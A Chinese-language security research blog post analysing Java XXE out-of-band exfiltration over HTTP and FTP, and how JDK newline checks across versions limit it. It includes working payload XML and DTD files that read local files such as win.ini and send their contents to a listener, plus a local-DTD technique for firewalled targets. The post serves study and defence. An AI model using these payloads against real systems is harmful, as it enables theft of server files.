---
title: JAVA XXE中两种数据传输形式及相关限制
date: 2020-05-07 10:40:08
tags: [sec,Java,XXE]
categories: Security
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>



示例代码：

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();
doc = dbBuilder.parse("xxe.xml");
```

### HTTP传输

xxe_http.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE ANY [
                <!ENTITY % dtd SYSTEM "http://127.0.0.1:8080/http.dtd">
                %dtd;
                %http;
                %send;
                ]>
<ANY>xxe</ANY>
```

http.dtd

```xml
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % http "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:8080/%file;'>">
```

在`dbBuilder.parse("xxe_http.xml")`时会产生异常

```
java.net.MalformedURLException: Illegal character in URL
	at sun.net.www.http.HttpClient.getURLFile(Unknown Source)
	at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(Unknown Source)
	at sun.net.www.protocol.http.HttpURLConnection.writeRequests(Unknown Source)
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.skipSeparator(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDecls(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.scanDTDInternalSubset(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.dispatch(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.next(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(Unknown Source)
```

这是因为在`rt.jar!/sun/net/www/http/HttpClient.class`中，JDK7u21

```java
public String getURLFile() throws IOException {
    String str = this.url.getFile();
    if (str == null || str.length() == 0) {
      str = "/";
    }

    if (this.usingProxy && !this.proxyDisabled) {
        //...
    }
    if (str.indexOf('\n') == -1) {
      return str;
    }
    throw new MalformedURLException("Illegal character in URL");
}
```

能够看到在处理httpURL的时候，如果字符串含有换行符(`\n`)就会直接抛出异常，而一般通过http外带基本只能拼接到url中，所以碰到需要往外带的数据含有换行符时就会失败

对`\n`的处理应该在比较早的版本就引入了，从commit中看到最早在05年的代码中就有这块处理，所以默认高版本Java应该是对url都有处理的

### FTP传输

xxe_ftp.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8080/ftp.dtd">
        %dtd;%ftp;%send;
        ]>
<ANY>xxe</ANY>
```

ftp.dtd

```xml
<!ENTITY % file SYSTEM "file:///D:/data.txt">
<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'>">
```

其中`%file;`的引用有两种方式，一个是在PASS字段引用，一个是在URL路径中引用，两种方式存在一定差异，具体可以见下面情况一分析

先来看触发XXE的过程中FTP客户端与服务端的交互

```
info: FTP: recvd 'USER fakeuser'
info: FTP: recvd 'PASS testdata'
info: FTP: recvd 'TYPE A'
info: FTP: recvd 'CWD .'
info: FTP: recvd 'EPSV ALL'
info: FTP: recvd 'EPSV'
info: FTP: recvd 'EPRT |1|127.0.0.1|50130|'
info: FTP: recvd 'LIST'
```

可以看到server会向client发送几个指令，包括要求提供用户名密码(数据在此阶段被带出)，切换路径，列出文件等过程。

使用Everything自带的FTP服务功能，通过抓包观察正常的FTP交互流程，大致是这样子的

![1575011384700](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103436.png)

注意到发送LIST指令时会返回150和226，那么在xxer中也尽可能模拟这个过程，但是在实际利用中会发现，当xxer服务端接收到LIST指令时，client与server不再有交互了，处于一个互相等待的过程中，具体的原因见下面分析

`sun.net.ftp.impl.FtpClient`处理`LIST`指令的过程中存在一个bug（可能与模拟的ftpserver没有支持所有指令有关），`FtpClient.openDataConnection()`方法中，

![1573805362144](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103807.png)

当ftpserver收到LIST指令后模拟正常ftp通信返回226代码，然后当前socket进入accept，会创建一个新的Socket，接着通过`java.net.ServerSocket#implAccept()`方法接受socket连接

![1573805487835](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103808.png)

但是此时的address是null，也就是说服务端和客户端此时是没有正常建立新的socket的，于是两端都处在等待状态，客户端就会被挂起。

然而抓包看整个通信过程，client与server的交互与正常的交互是一模一样的，正常ftp服务端收到LIST指令后返回226传输完毕，当前socket会正常关闭，然后等待下一次交互指令，但是在xxer/xxeserv模拟的过程中却会被挂起，这个问题暂时没有解决办法。（passive mode，客户端发送指令使服务端进入被动模式，但没有效果）

如果这个过程是发生在weblogic端并且Java版本较低时，并不影响数据传输，只是会有一个对ftpserver的长连接，但是如果是在本地通过外部实体的方式解析xml文件，同样会被挂在长连接的过程，于是就有可能无法生成相应的payload

网上也有相关问题https://stackoverflow.com/questions/3666124/ftp-connection-hangs-on-list



Tips：如何利用FTP获取目标Java版本

ftp.dtd

```xml
<!ENTITY % file SYSTEM "file:///D:/data.txt">
<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://127.0.0.1:2121/%file;'>">
```

当不指定用户名和密码直接连接FTP时，client默认会以anonymous登录，密码则是client的Java版本，所以可以利用这个方式获取目标服务器的Java版本：

```
info: FTP: recvd 'USER anonymous'
info: FTP: recvd 'PASS Java1.7.0_21@'
info: FTP: recvd 'TYPE I'
info: FTP: recvd 'EPSV ALL'
info: FTP: recvd 'EPSV'
info: FTP: recvd 'EPRT |1|127.0.0.1|54357|'
info: FTP: recvd 'RETR tesdata'
```



#### FTP中特殊字符的问题

##### 情况一

各种特殊字符在特定版本下的情况

- 测试的jdk版本：**JDK7u21**
- pwd字段意义：`<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'>">`
- file字段意义：`<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:s@127.0.0.1:2121/%file;'>">`

| 符号/位置 | \n   | [    | '    | "    | %     | &     | @     | #     | ?     | /     |
| --------- | ---- | ---- | ---- | ---- | ----- | ----- | ----- | ----- | ----- | ----- |
| pwd字段   | √    | ×    | ×    | √    | ×(*0) | ×(*0) | ×(*1) | √     | ×     | ×     |
| file字段  | √    | √    | ×    | √    | ×     | ×     | √     | √(*2) | √(*3) | √(*4) |

> - *0：org.xml.sax.SAXParseException：`%` `&`都有实际意义，不能被正常引用和替换
> - *1：java.net.UnknownHostException：@被当作用户名:密码@主机，不能正确处理
> - *2：会截断`#`之后的内容，URL锚点
> - *3：会截断`?`之后的内容，URL参数
> - *4：`/`分隔的每部分会单独出现在CWD指令中，最后一部分出现在%file

解决办法：

1. 单引号/双引号：能否正常读取取决于参数实体的写法，简单说就是用单引号来防止闭合双引号，用双引号来防止闭合单引号；
2. `<` `%` `&`等，通过`<![CDATA[<"%'&]]>`忽略特殊字符；

##### 情况二

换行符在不同版本下的情况

jdk7u131与jdk7u141的[对比](http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/comparison/e890a6aef622/src/share/classes/sun/net/ftp/impl/FtpClient.java)

![1574933020030](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103809.png)

jdk8u131-b08与jdk8u131-b09的[对比](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/comparison/81ddd5fc5a4e/src/share/classes/sun/net/ftp/impl/FtpClient.java)

![1574933574859](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103810.png)

因此，通过ftp外带数据时，Java版本 **<7u141-b00** 或 **<8u131-b09** 时才不会受文件中`\n`的影响。

相关链接：https://bugzilla.redhat.com/show_bug.cgi?id=1443083



上面的修复补丁都是在`rt.jar!/sun/net/ftp/impl/FtpClient.class#issueCommand()`中增加对换行符的判断，但是四哥在[Java底层修改对XXE利用FTP通道的影响](http://scz.617.cn/misc/201911011122.txt)中提到FTP通道被阻断的时候还没有触发到`issueCommand()`，这边也来调试一下

环境JDK8u141，直接断到`issueCommand()`

发现在8u141中，对`\n`的检查确实是在`issueCommand()`，RETR返回的数据中如果有换行符就抛出`sun.net.ftp.FtpProtocolException: Illegal FTP command`，那么四哥说的在这之前有一个checkURL方法又是在哪里呢，搜一下java源码确定一下引入checkURL是在哪个版本

最终找到相关更新：http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/diff/5652862ec123/src/share/classes/sun/net/www/protocol/ftp/FtpURLConnection.java

github上相关[commit](https://github.com/JetBrains/jdk8u_jdk/commit/4aacc0da12ae2f5bb29aa1b304ba62da23bb024a#diff-3f0521a031333913976fe611f840d0ebR160)，版本是 jdk8u_jdk-jb8u232-b1638.6，时间是2019年4月份

![1574996536989](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103811.png)

1.8.0_141相关调用栈

```
Exception in thread "main" java.io.IOException: sun.net.ftp.FtpProtocolException: Illegal FTP command
	at sun.net.www.protocol.ftp.FtpURLConnection.getInputStream(FtpURLConnection.java:518)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:623)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
```

1.8.0_232相关调用栈

```
Exception in thread "main" java.lang.IllegalArgumentException: Illegal character in URL
	at sun.net.www.protocol.ftp.FtpURLConnection.checkURL(FtpURLConnection.java:164)
	at sun.net.www.protocol.ftp.FtpURLConnection.<init>(FtpURLConnection.java:188)
	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:61)
	at sun.net.www.protocol.ftp.Handler.openConnection(Handler.java:56)
	at java.net.URL.openConnection(URL.java:1001)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:621)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1304)
	at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1240)
	at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.startPE(XMLDTDScannerImpl.java:741)
```



综上，利用XXE漏洞通过FTP协议外带数据时，能否成功受Java版本影响，总结如下

1. **<7u141-b00** 或 **<8u131-b09** ：不会受文件中`\n`的影响；
2. **>jdk8u131**：能创建FTP连接，外带文件内容中含有`\n`则抛出异常；
3. **>jdk8u232**：不能创建FTP连接，只要url中含有`\n`就会抛出异常；



## dtd引用中的问题

### 问题1

内部实体与外部实体不能结合使用

有一个需要注意的点是，参数实体只能在DTD中引用，举个例子

```xml
<!ELEMENT person1 (name, sex, age)>
<!ELEMENT person2 (name, sex, age)>
<!ELEMENT person3 (name, sex, age)>
```

为了减少重复定义某些元素，可以通过参数实体的方式进行定义，如

```xml
<!ELEMENT %res "name, sex, age">
```

然后通过%res进行引用

```xml
<!ELEMENT person1 (%res;)>
<!ELEMENT person2 (%res;)>
<!ELEMENT person3 (%res;)>
```

但是这种元素替换的方式**仅限于外部DTD**。在以上过程中，参数实体将元素组保存在DTD的外部子集中，因为内部子集有非常严格的校验，即标记声明中不允许引用参数实体，如下的参数实体引用是会失败的，抛出异常`java.io.IOException: org.xml.sax.SAXParseException: The parameter entity reference "%file;" cannot occur within markup in the internal subset of the DTD.`

![1574842595707](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20200507103812.png)

这些实体可以定义DTD语法，但不能定义在另一个DTD标签中立即引用，如下面的使用也将失败：

```xml
<!ENTITY %res "name, sex, age">
<!ELEMENT person (%res;)>
```

但是，可以通过在外部参数实体中声明，在内部DTD子集中使用的形式：

```xml
<!DOCTYPE ANY [
        <!ENTITY % dtd SYSTEM "http://localhost/my.dtd">
<ANY>xxe</ANY>
```

远程my.dtd

```xml
<!ENTITY % file SYSTEM "file:///C:/file">
```

总结，对于上面定义的参数实体，需要注意的点是：

- 对参数实体的引用只能在DTD中发生；
- 参数实体不能在文档主体中使用；
- 内部DTD子集中的标记内不允许使用参数实体引用；
- 参数实体允许创建其他实体和参数实体；



### 问题2

无法向外请求dtd

假如目标系统存在防火墙，无法对外发起连接，就不能通过外部dtd注入了，此时可以利用系统本地已存在的dtd文件，覆盖其中的某个实体，通过报错形式进行利用

local.dtd

```xml
<?xml version="1.0" encoding="UTF-8"?>

        <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd">

        <!ENTITY % onerrortypes '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///D:/data.txt">
        <!ENTITY &#x25; http "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://127.0.0.1:8080/&#x25;file;&#x27;>">
        &#x25;http;
        &#x25;send;
        <!ATTLIST xxe aa "bb" #IMPLIED'>
        %local_dtd;
        ]>
```

xxe_http.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
        <!ENTITY % dtd SYSTEM "http://127.0.0.1:8080/local.dtd">
        %dtd;
        ]>
<ANY>xxe</ANY>
```

更多的本地dtd可以参考https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md

另一个思路：从目标机器上的jar包中发现可以被利用的本地dtd文件



参考：

- https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/
- https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/



<script>pangu.spacingPage();</script>